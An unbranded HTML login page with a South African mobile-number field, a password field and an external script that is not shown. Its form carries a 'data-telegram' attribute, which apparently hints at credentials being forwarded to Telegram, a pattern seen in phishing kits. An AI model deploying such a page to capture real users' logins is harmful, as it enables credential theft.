
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>

  <!-- Connect your CSS -->
  <link rel="stylesheet" href="/style.css">
</head>

<body>

<div class="page">

  <!-- Decorative cloud -->
  <div class="decoration-cloud">
    <svg viewBox="0 0 300 220" xmlns="http://www.w3.org/2000/svg">
      <path d="M25 115 C-5 90 10 45 48 48
      C48 10 95 0 120 30
      C145 -5 195 10 205 40
      C245 20 280 55 265 90
      C300 115 280 160 245 160
      C230 205 180 210 155 185
      C120 220 70 195 70 165
      C35 175 5 150 25 115Z"
      fill="#fffedc" stroke="#16e98a" stroke-width="10"/>
    </svg>
  </div>

  <!-- Navigation -->
  <div class="top-buttons">
    <button type="button" class="nav-btn active">Login</button>
    <button type="button" class="nav-btn">Sign Up</button>
  </div>

  <!-- Login panel -->
  <div class="login-modal">

    <div class="modal-header">
      <h2>Login</h2>
      <button type="button" class="close-btn">×</button>
    </div>

    <form id="accessForm" data-telegram>

      <div class="phone-field">
        <span>+27</span>
        <input
          type="tel"
          name="phone"
          placeholder="Mobile Number"
          autocomplete="tel"
        >
      </div>

      <div class="password-field">
        <input
          type="password"
          id="password"
          placeholder="Enter Password"
          autocomplete="off"
          disabled
        >
      </div>

      <div class="forgot-links">
        <a href="#">Forgot Username</a>
        <a href="#">Forgot Password?</a>
      </div>

      <div class="signup-strip">
        <span>Don't have an account yet?</span>
        <a href="#">Sign Up ›</a>
      </div>

      <button type="submit" class="login-btn">Login</button>

    </form>

    <p id="message"></p>
  </div>

  <!-- Decorative speech bubble -->
  <div class="decoration-bubble">
    <svg viewBox="0 0 400 260" xmlns="http://www.w3.org/2000/svg">
      <path d="M200 15 C95 15 20 65 20 130
      C20 195 95 235 200 235
      C250 235 290 225 320 205
      L385 255 L345 190
      C365 170 380 150 380 130
      C380 65 305 15 200 15Z"
      fill="#fffedc" stroke="#16e98a" stroke-width="10"/>
    </svg>
  </div>

</div>

<script src="/script.js" defer></script>

</body>
</html>
